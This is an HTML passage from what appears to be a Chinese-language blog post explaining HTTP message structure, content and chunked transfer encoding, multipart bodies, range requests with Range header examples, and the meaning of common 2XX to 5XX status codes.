<p>&#x7528;&#x4E8E;HTTP&#x534F;&#x8BAE;&#x4EA4;&#x4E92;&#x7684;&#x4FE1;&#x606F;&#x88AB;&#x79F0;&#x4E3A;HTTP&#x62A5;&#x6587;&#x3002;&#x8BF7;&#x6C42;&#x7AEF;&#xFF08;&#x5BA2;&#x6237;&#x7AEF;&#xFF09;&#x7684;HTTP&#x62A5;&#x6587;&#x53EB;&#x505A;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#xFF0C;&#x54CD;&#x5E94;&#x7AEF;&#xFF08;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#xFF09;&#x7684;&#x53EB;&#x505A;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x3002;HTTP&#x62A5;&#x6587;&#x5927;&#x81F4;&#x53EF;&#x5206;&#x4E3A;&#x62A5;&#x6587;&#x9996;&#x90E8;&#x548C;&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x4E24;&#x5757;&#x3002;&#x4E24;&#x8005;&#x7531;&#x6700;&#x521D;&#x51FA;&#x73B0;&#x7684;&#x7A7A;&#x884C;&#x6765;&#x5212;&#x5206;&#x3002;&#x901A;&#x5E38;&#x5E76;&#x4E0D;&#x4E00;&#x5B9A;&#x8981;&#x6709;&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x3002;</p>
<p>&#x8BF7;&#x6C42;&#x884C;&#x5305;&#x542B;&#x7528;&#x4E8E;&#x8BF7;&#x6C42;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x8BF7;&#x6C42;URI&#x548C;HTTP&#x7248;&#x672C;&#x3002;&#x72B6;&#x6001;&#x884C;&#x5305;&#x542B;&#x8868;&#x660E;&#x54CD;&#x5E94;&#x7ED3;&#x679C;&#x7684;&#x72B6;&#x6001;&#x7801;&#xFF0C;&#x539F;&#x56E0;&#x77ED;&#x8BED;&#x548C;HTTP&#x7248;&#x672C;&#x3002;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x5305;&#x542B;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x7684;&#x5404;&#x79CD;&#x6761;&#x4EF6;&#x548C;&#x5C5E;&#x6027;&#x7684;&#x5404;&#x7C7B;&#x9996;&#x90E8;&#x3002;&#x4E00;&#x822C;&#x6709;4&#x79CD;&#x9996;&#x90E8;&#xFF0C;&#x5206;&#x522B;&#x662F;&#xFF1A;&#x901A;&#x7528;&#x9996;&#x90E8;&#x3001;&#x8BF7;&#x6C42;&#x9996;&#x90E8;&#x3001;&#x54CD;&#x5E94;&#x9996;&#x90E8;&#x548C;&#x5B9E;&#x4F53;&#x9996;&#x90E8;&#x3002;&#x5176;&#x4ED6;&#x53EF;&#x80FD;&#x5305;&#x542B;HTTP&#x7684;RFC&#x91CC;&#x672A;&#x5B9A;&#x4E49;&#x7684;&#x9996;&#x90E8;&#xFF08;Cookie&#x7B49;&#xFF09;&#x3002;</p>
<p>&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x548C;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x7684;&#x5DEE;&#x5F02;&#x5728;&#x4E8E;&#x62A5;&#x6587;&#xFF08;message&#xFF09;&#x662F;HTTP&#x901A;&#x4FE1;&#x4E2D;&#x7684;&#x57FA;&#x672C;&#x5355;&#x4F4D;&#xFF0C;&#x7531;8&#x4F4D;&#x7EC4;&#x5B57;&#x8282;&#x6D41;&#xFF08;octet sequence&#xFF0C;&#x5176;&#x4E2D;octet&#x4E3A;8&#x4E2A;&#x6BD4;&#x7279;&#xFF09;&#x7EC4;&#x6210;&#xFF0C;&#x901A;&#x8FC7;HTTP&#x901A;&#x4FE1;&#x4F20;&#x8F93;&#x3002;&#x5B9E;&#x4F53;&#xFF08;entity&#xFF09;&#x4F5C;&#x4E3A;&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x7684;&#x6709;&#x6548;&#x8F7D;&#x8377;&#x6570;&#x636E;&#xFF08;&#x8865;&#x5145;&#x9879;&#xFF09;&#x88AB;&#x4F20;&#x8F93;&#xFF0C;&#x5176;&#x5185;&#x5BB9;&#x7531;&#x5B9E;&#x4F53;&#x9996;&#x90E8;&#x548C;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x7EC4;&#x6210;&#x3002;</p>
<p>HTTP&#x534F;&#x8BAE;&#x4E2D;&#x6709;&#x4E00;&#x79CD;&#x88AB;&#x79F0;&#x4E3A;&#x5185;&#x5BB9;&#x7F16;&#x7801;&#x7684;&#x529F;&#x80FD;&#x4E5F;&#x80FD;&#x8FDB;&#x884C;&#x7C7B;&#x4F3C;&#x538B;&#x7F29;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x5185;&#x5BB9;&#x7F16;&#x7801;&#x6307;&#x660E;&#x5E94;&#x7528;&#x5728;&#x5B9E;&#x4F53;&#x5185;&#x5BB9;&#x4E0A;&#x7684;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#xFF0C;&#x5E76;&#x4FDD;&#x6301;&#x5B9E;&#x4F53;&#x4FE1;&#x606F;&#x539F;&#x6837;&#x538B;&#x7F29;&#x3002;&#x5185;&#x5BB9;&#x7F16;&#x7801;&#x540E;&#x7684;&#x5B9E;&#x4F53;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x63A5;&#x6536;&#x5E76;&#x8D1F;&#x8D23;&#x89E3;&#x7801;&#x3002;&#x5E38;&#x7528;&#x7684;&#x5185;&#x5BB9;&#x7F16;&#x7801;&#x6709;&#xFF1A;gzip&#xFF08;GNU zip&#xFF09;&#x3001;compress&#xFF08;UNIX&#x7CFB;&#x7EDF;&#x7684;&#x6807;&#x51C6;&#x538B;&#x7F29;&#xFF09;&#x3002;</p>
<p>HTTP&#x901A;&#x4FE1;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x8BF7;&#x6C42;&#x7684;&#x7F16;&#x7801;&#x5B9E;&#x4F53;&#x8D44;&#x6E90;&#x5C1A;&#x672A;&#x5168;&#x90E8;&#x4F20;&#x8F93;&#x5B8C;&#x6210;&#x4E4B;&#x524D;&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x65E0;&#x6CD5;&#x663E;&#x793A;&#x8BF7;&#x6C42;&#x9875;&#x9762;&#x3002;&#x5728;&#x4F20;&#x8F93;&#x5927;&#x5BB9;&#x91CF;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;&#x628A;&#x6570;&#x636E;&#x5206;&#x5272;&#x6210;&#x591A;&#x5757;&#xFF0C;&#x80FD;&#x591F;&#x8BA9;&#x6D4F;&#x89C8;&#x5668;&#x9010;&#x6B65;&#x663E;&#x793A;&#x9875;&#x9762;&#x3002;&#x8FD9;&#x79CD;&#x628A;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x5206;&#x5757;&#x7684;&#x529F;&#x80FD;&#x79F0;&#x4E3A;&#x5206;&#x5757;&#x4F20;&#x8F93;&#x7F16;&#x7801;&#xFF08;Chunked Transfer Coding&#xFF09;&#x3002;&#x4F7F;&#x7528;&#x5206;&#x5757;&#x4F20;&#x8F93;&#x7F16;&#x7801;&#x7684;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x4F1A;&#x7531;&#x63A5;&#x6536;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x8D1F;&#x8D23;&#x89E3;&#x7801;&#xFF0C;&#x6062;&#x590D;&#x5230;&#x7F16;&#x7801;&#x524D;&#x7684;&#x5B9E;&#x4F53;&#x4E3B;&#x4F53;&#x3002;</p>
<p>HTTP&#x534F;&#x8BAE;&#x4E2D;&#x4E5F;&#x91C7;&#x7EB3;&#x4E86;&#x591A;&#x90E8;&#x5206;&#x5BF9;&#x8C61;&#x96C6;&#x5408;&#xFF0C;&#x53D1;&#x9001;&#x7684;&#x4E00;&#x4EFD;&#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x5185;&#x53EF;&#x542B;&#x6709;&#x591A;&#x7C7B;&#x578B;&#x5B9E;&#x4F53;&#x3002;&#x901A;&#x5E38;&#x662F;&#x5728;&#x56FE;&#x7247;&#x6216;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x7B49;&#x4E0A;&#x4F20;&#x65F6;&#x4F7F;&#x7528;&#x3002;multipart/form-data &#x548C; multipart/byteranges &#x5206;&#x522B;&#x5728;Web&#x8868;&#x5355;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x65F6;&#x4F7F;&#x7528;&#xFF1B;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x5305;&#x542B;&#x4E86;&#x591A;&#x4E2A;&#x8303;&#x56F4;&#x7684;&#x5185;&#x5BB9;&#x65F6;&#x4F7F;&#x7528;&#x3002;</p>
<p>&#x5982;&#x679C;&#x4E0B;&#x8F7D;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x5230;&#x7F51;&#x7EDC;&#x4E2D;&#x65AD;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x90A3;&#x5C31;&#x5FC5;&#x987B;&#x91CD;&#x5934;&#x5F00;&#x59CB;&#x3002;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x79CD;&#x53EF;&#x6062;&#x590D;&#x7684;&#x673A;&#x5236;&#x3002;&#x6240;&#x8C13;&#x6062;&#x590D;&#x662F;&#x6307;&#x80FD;&#x4ECE;&#x4E4B;&#x524D;&#x4E0B;&#x8F7D;&#x4E2D;&#x65AD;&#x5904;&#x6062;&#x590D;&#x4E0B;&#x8F7D;&#x3002;&#x8981;&#x5B9E;&#x73B0;&#x8BE5;&#x529F;&#x80FD;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4E0B;&#x8F7D;&#x7684;&#x5B9E;&#x4F53;&#x8303;&#x56F4;&#xFF0C;&#x6307;&#x5B9A;&#x8303;&#x56F4;&#x53D1;&#x9001;&#x7684;&#x8BF7;&#x6C42;&#x53EB;&#x505A;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF08;Range Request&#xFF09;&#x3002;&#x6267;&#x884C;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x4F1A;&#x7528;&#x5230;&#x9996;&#x90E8;&#x5B57;&#x6BB5;Range&#x6765;&#x6307;&#x5B9A;&#x8D44;&#x6E90;&#x7684;byte&#x8303;&#x56F4;&#x3002;&#x9488;&#x5BF9;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF0C;&#x54CD;&#x5E94;&#x4F1A;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;&#x4E3A;206 Partial Content&#x7684;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5BF9;&#x4E8E;&#x591A;&#x91CD;&#x8303;&#x56F4;&#x7684;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF0C;&#x54CD;&#x5E94;&#x4F1A;&#x5728;&#x9996;&#x90E8;&#x5B57;&#x6BB5;Content-Type&#x6807;&#x660E;multipart/byteranges&#x540E;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x3002;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x65E0;&#x6CD5;&#x54CD;&#x5E94;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF0C;&#x5219;&#x4F1A;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;200 OK&#x548C;&#x5B8C;&#x6574;&#x7684;&#x5B9E;&#x4F53;&#x5185;&#x5BB9;&#x3002;</p>
<pre><code class="language-javascript">// &#x4ECE;5001&#xFF5E;10000&#x5B57;&#x8282;
Range: bytes=5001-10000
// &#x4ECE;5001&#x5B57;&#x8282;&#x4E4B;&#x540E;&#x5168;&#x90E8;&#x7684;
Range: bytes=5001-
// &#x4ECE;&#x4E00;&#x5F00;&#x59CB;&#x5230;3000&#x5B57;&#x8282;&#x548C;5000&#xFF5E;7000&#x5B57;&#x8282;&#x7684;&#x591A;&#x91CD;&#x8303;&#x56F4;
Range: bytes=-3000, 5000-7000
</code></pre>
<h2 id="%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%9A%84http%E7%8A%B6%E6%80%81%E7%A0%81">&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x7684;HTTP&#x72B6;&#x6001;&#x7801;</h2>
<p>&#x72B6;&#x6001;&#x7801;&#x7684;&#x804C;&#x8D23;&#x662F;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x63CF;&#x8FF0;&#x8FD4;&#x56DE;&#x7684;&#x8BF7;&#x6C42;&#x7ED3;&#x679C;&#x3002;&#x501F;&#x52A9;&#x72B6;&#x6001;&#x7801;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x662F;&#x6B63;&#x5E38;&#x5904;&#x7406;&#x4E86;&#x8BF7;&#x6C42;&#xFF0C;&#x8FD8;&#x662F;&#x51FA;&#x73B0;&#x4E86;&#x9519;&#x8BEF;&#x3002;&#x6570;&#x5B57;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4F4D;&#x6307;&#x5B9A;&#x4E86;&#x54CD;&#x5E94;&#x7C7B;&#x522B;&#xFF0C;&#x540E;&#x4E24;&#x4F4D;&#x65E0;&#x5206;&#x7C7B;&#x3002;&#x54CD;&#x5E94;&#x7C7B;&#x522B;&#x6709;&#x4EE5;&#x4E0B;5&#x79CD;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/status-code.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<h3 id="2xx%E6%88%90%E5%8A%9F">2XX&#x6210;&#x529F;</h3>
<ul>
<li>200 OK &#x8868;&#x793A;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x88AB;&#x6B63;&#x5E38;&#x5904;&#x7406;&#x4E86;&#x3002;</li>
<li>204 No Content &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x4EE3;&#x8868;&#x670D;&#x52A1;&#x5668;&#x63A5;&#x6536;&#x7684;&#x8BF7;&#x6C42;&#x5DF2;&#x6210;&#x529F;&#x5904;&#x7406;&#xFF0C;&#x4F46;&#x5728;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E2D;&#x4E0D;&#x542B;&#x5B9E;&#x4F53;&#x7684;&#x4E3B;&#x4F53;&#x90E8;&#x5206;&#x3002;&#x4E5F;&#x4E0D;&#x5141;&#x8BB8;&#x8FD4;&#x56DE;&#x4EFB;&#x4F55;&#x5B9E;&#x4F53;&#x7684;&#x4E3B;&#x4F53;&#x3002;</li>
<li>206 Partial Content &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x884C;&#x4E86;&#x8303;&#x56F4;&#x8BF7;&#x6C42;&#xFF0C;&#x800C;&#x670D;&#x52A1;&#x5668;&#x6210;&#x529F;&#x6267;&#x884C;&#x4E86;&#x8FD9;&#x90E8;&#x5206;&#x7684;GET&#x8BF7;&#x6C42;&#x3002;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E2D;&#x5305;&#x542B;&#x7531;Content-Range&#x6307;&#x5B9A;&#x8303;&#x56F4;&#x7684;&#x5B9E;&#x4F53;&#x5185;&#x5BB9;&#x3002;</li>
</ul>
<h3 id="3xx%E9%87%8D%E5%AE%9A%E5%90%91">3XX&#x91CD;&#x5B9A;&#x5411;</h3>
<ul>
<li>301 Moved Permanently &#x6C38;&#x4E45;&#x6027;&#x91CD;&#x5B9A;&#x5411;&#x3002;&#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x5DF2;&#x88AB;&#x5206;&#x914D;&#x4E86;&#x65B0;&#x7684;URI&#xFF0C;&#x4EE5;&#x540E;&#x5E94;&#x4F7F;&#x7528;&#x8D44;&#x6E90;&#x73B0;&#x5728;&#x6240;&#x6307;&#x7684;URI&#x3002;&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x628A;&#x8D44;&#x6E90;&#x5BF9;&#x5E94;&#x7684;URI&#x4FDD;&#x5B58;&#x4E3A;&#x4E66;&#x7B7E;&#x4E86;&#xFF0C;&#x8FD9;&#x65F6;&#x5E94;&#x8BE5;&#x6309;Location&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x63D0;&#x793A;&#x7684;URI&#x91CD;&#x65B0;&#x4FDD;&#x5B58;&#x3002;</li>
<li>302 Found &#x4E34;&#x65F6;&#x6027;&#x91CD;&#x5B9A;&#x5411;&#x3002;&#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x5DF2;&#x88AB;&#x5206;&#x914D;&#x4E86;&#x65B0;&#x7684;URI&#xFF0C;&#x5E0C;&#x671B;&#x7528;&#x6237;&#xFF08;&#x672C;&#x6B21;&#xFF09;&#x80FD;&#x4F7F;&#x7528;&#x65B0;&#x7684;URI&#x8BBF;&#x95EE;&#x3002;</li>
<li>303 See Other &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x7531;&#x4E8E;&#x8BF7;&#x6C42;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#x5B58;&#x5728;&#x7740;&#x53E6;&#x4E00;&#x4E2A;URI&#xFF0C;&#x5E94;&#x4F7F;&#x7528;GET&#x65B9;&#x6CD5;&#x5B9A;&#x5411;&#x83B7;&#x53D6;&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x3002;303&#x72B6;&#x6001;&#x7801;&#x548C;302 Found&#x72B6;&#x6001;&#x7801;&#x6709;&#x7740;&#x76F8;&#x540C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;303&#x72B6;&#x6001;&#x7801;&#x660E;&#x786E;&#x8868;&#x793A;&#x5BA2;&#x6237;&#x7AEF;&#x5E94;&#x5F53;&#x91C7;&#x7528;GET&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x8D44;&#x6E90;&#xFF0C;&#x8FD9;&#x70B9;&#x4E0E;302&#x72B6;&#x6001;&#x7801;&#x6709;&#x533A;&#x522B;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x5F53;&#x4F7F;&#x7528;POST&#x65B9;&#x6CD5;&#x8BBF;&#x95EE;CGI&#x7A0B;&#x5E8F;&#xFF0C;&#x5176;&#x6267;&#x884C;&#x540E;&#x7684;&#x5904;&#x7406;&#x7ED3;&#x679C;&#x662F;&#x5E0C;&#x671B;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x4EE5;GET&#x65B9;&#x6CD5;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x53E6;&#x4E00;&#x4E2A;URI&#x4E0A;&#x53BB;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;303&#x72B6;&#x6001;&#x7801;&#x3002;&#x867D;&#x7136;302 Found&#x72B6;&#x6001;&#x7801;&#x4E5F;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x76F8;&#x540C;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;303&#x72B6;&#x6001;&#x7801;&#x662F;&#x6700;&#x7406;&#x60F3;&#x7684;&#x3002;&#xFFFC;&#x5F53;301&#x3001;302&#x3001;303&#x54CD;&#x5E94;&#x72B6;&#x6001;&#x7801;&#x8FD4;&#x56DE;&#x65F6;&#xFF0C;&#x51E0;&#x4E4E;&#x6240;&#x6709;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x4F1A;&#x628A;POST&#x6539;&#x6210;GET&#xFF0C;&#x5E76;&#x5220;&#x9664;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x5185;&#x7684;&#x4E3B;&#x4F53;&#xFF0C;&#x4E4B;&#x540E;&#x8BF7;&#x6C42;&#x4F1A;&#x81EA;&#x52A8;&#x518D;&#x6B21;&#x53D1;&#x9001;&#x3002;301&#x3001;302&#x6807;&#x51C6;&#x662F;&#x7981;&#x6B62;&#x5C06;POST&#x65B9;&#x6CD5;&#x6539;&#x53D8;&#x6210;GET&#x65B9;&#x6CD5;&#x7684;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4F7F;&#x7528;&#x65F6;&#x5927;&#x5BB6;&#x90FD;&#x4F1A;&#x8FD9;&#x4E48;&#x505A;&#x3002;</li>
<li>304 Not Modified &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;<u>&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x9644;&#x5E26;&#x6761;&#x4EF6;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5141;&#x8BB8;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;&#x8D44;&#x6E90;&#xFF0C;&#x4F46;&#x56E0;&#x53D1;&#x751F;&#x8BF7;&#x6C42;&#x672A;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x7684;&#x60C5;&#x51B5;&#x540E;&#xFF0C;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;304 Not Modified</u>&#xFF08;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8D44;&#x6E90;&#x672A;&#x6539;&#x53D8;&#xFF0C;&#x53EF;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;&#x672A;&#x8FC7;&#x671F;&#x7684;&#x7F13;&#x5B58;&#xFF09;&#x3002;304&#x72B6;&#x6001;&#x7801;&#x8FD4;&#x56DE;&#x65F6;&#xFF0C;&#x4E0D;&#x5305;&#x542B;&#x4EFB;&#x4F55;&#x54CD;&#x5E94;&#x7684;&#x4E3B;&#x4F53;&#x90E8;&#x5206;&#x3002;<u>304&#x867D;&#x7136;&#x88AB;&#x5212;&#x5206;&#x5728;3XX&#x7C7B;&#x522B;&#x4E2D;&#xFF0C;&#x4F46;&#x662F;&#x548C;&#x91CD;&#x5B9A;&#x5411;&#x6CA1;&#x6709;&#x5173;&#x7CFB;&#x3002;</u></li>
<li><a href="https://stackoverflow.com/questions/2068418/whats-the-difference-between-a-302-and-a-307-redirect">307 Temporary Redirect &#x4E34;&#x65F6;&#x91CD;&#x5B9A;&#x5411;</a>&#x3002;&#x8BE5;&#x72B6;&#x6001;&#x7801;&#x4E0E;302 Found&#x6709;&#x7740;&#x76F8;&#x540C;&#x7684;&#x542B;&#x4E49;&#x3002;&#x5C3D;&#x7BA1;302&#x6807;&#x51C6;&#x7981;&#x6B62;POST&#x53D8;&#x6362;&#x6210;GET&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4F7F;&#x7528;&#x65F6;&#x5927;&#x5BB6;&#x5E76;&#x4E0D;&#x9075;&#x5B88;&#x3002;307&#x4F1A;&#x9075;&#x7167;&#x6D4F;&#x89C8;&#x5668;&#x6807;&#x51C6;&#xFF0C;&#x4E0D;&#x4F1A;&#x4ECE;POST&#x53D8;&#x6210;GET&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5BF9;&#x4E8E;&#x5904;&#x7406;&#x54CD;&#x5E94;&#x65F6;&#x7684;&#x884C;&#x4E3A;&#xFF0C;&#x6BCF;&#x79CD;&#x6D4F;&#x89C8;&#x5668;&#x6709;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x4E0D;&#x540C;&#x7684;&#x60C5;&#x51B5;&#x3002;</li>
</ul>
<h3 id="4xx%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%94%99%E8%AF%AF">4XX&#x5BA2;&#x6237;&#x7AEF;&#x9519;&#x8BEF;</h3>
<ul>
<li>400 Bad Request &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x4E2D;&#x5B58;&#x5728;&#x8BED;&#x6CD5;&#x9519;&#x8BEF;&#x3002;&#x5F53;&#x9519;&#x8BEF;&#x53D1;&#x751F;&#x65F6;&#xFF0C;&#x9700;&#x4FEE;&#x6539;&#x8BF7;&#x6C42;&#x7684;&#x5185;&#x5BB9;&#x540E;&#x518D;&#x6B21;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002;</li>
<li>401 Unauthorized &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x53D1;&#x9001;&#x7684;&#x8BF7;&#x6C42;&#x9700;&#x8981;&#x6709;&#x901A;&#x8FC7;HTTP&#x8BA4;&#x8BC1;&#xFF08;BASIC&#x8BA4;&#x8BC1;&#x3001;DIGEST&#x8BA4;&#x8BC1;&#xFF09;&#x7684;&#x8BA4;&#x8BC1;&#x4FE1;&#x606F;&#x3002;&#x53E6;&#x5916;&#x82E5;&#x4E4B;&#x524D;&#x5DF2;&#x8FDB;&#x884C;&#x8FC7;1&#x6B21;&#x8BF7;&#x6C42;&#xFF0C;&#x5219;&#x8868;&#x793A;&#x7528;&#x6237;&#x8BA4;&#x8BC1;&#x5931;&#x8D25;&#x3002;</li>
<li>403 Forbidden &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x660E;&#x5BF9;&#x8BF7;&#x6C42;&#x8D44;&#x6E90;&#x7684;&#x8BBF;&#x95EE;&#x88AB;&#x670D;&#x52A1;&#x5668;&#x62D2;&#x7EDD;&#x4E86;&#x3002;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x7ED9;&#x51FA;&#x62D2;&#x7EDD;&#x7684;&#x8BE6;&#x7EC6;&#x7406;&#x7531;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x60F3;&#x4F5C;&#x8BF4;&#x660E;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x5B9E;&#x4F53;&#x7684;&#x4E3B;&#x4F53;&#x90E8;&#x5206;&#x5BF9;&#x539F;&#x56E0;&#x8FDB;&#x884C;&#x63CF;&#x8FF0;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x8BA9;&#x7528;&#x6237;&#x770B;&#x5230;&#x4E86;&#x3002;</li>
<li>404 Not Found &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x660E;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x65E0;&#x6CD5;&#x627E;&#x5230;&#x8BF7;&#x6C42;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x62D2;&#x7EDD;&#x8BF7;&#x6C42;&#x4E14;&#x4E0D;&#x60F3;&#x8BF4;&#x660E;&#x7406;&#x7531;&#x65F6;&#x4F7F;&#x7528;&#x3002;</li>
</ul>
<h3 id="5xx%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%94%99%E8%AF%AF">5XX&#x670D;&#x52A1;&#x5668;&#x9519;&#x8BEF;</h3>
<ul>
<li>500 Internal Server Error &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x660E;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5728;&#x6267;&#x884C;&#x8BF7;&#x6C42;&#x65F6;&#x53D1;&#x751F;&#x4E86;&#x9519;&#x8BEF;&#x3002;&#x4E5F;&#x6709;&#x53EF;&#x80FD;&#x662F;Web&#x5E94;&#x7528;&#x5B58;&#x5728;&#x7684;bug&#x6216;&#x67D0;&#x4E9B;&#x4E34;&#x65F6;&#x7684;&#x6545;&#x969C;&#x3002;</li>
<li>503 Service Unavailable &#x8BE5;&#x72B6;&#x6001;&#x7801;&#x8868;&#x660E;&#x670D;&#x52A1;&#x5668;&#x6682;&#x65F6;&#x5904;&#x4E8E;&#x8D85;&#x8D1F;&#x8F7D;&#x6216;&#x6B63;&#x5728;&#x8FDB;&#x884C;&#x505C;&#x673A;&#x7EF4;&#x62A4;&#xFF0C;&#x73B0;&#x5728;&#x65E0;&#x6CD5;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x3002;&#x5982;&#x679C;&#x4E8B;&#x5148;&#x5F97;&#x77E5;&#x89E3;&#x9664;&#x4EE5;&#x4E0A;&#x72B6;&#x51B5;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6700;&#x597D;&#x5199;&#x5165;Retry-After&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x518D;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</li>
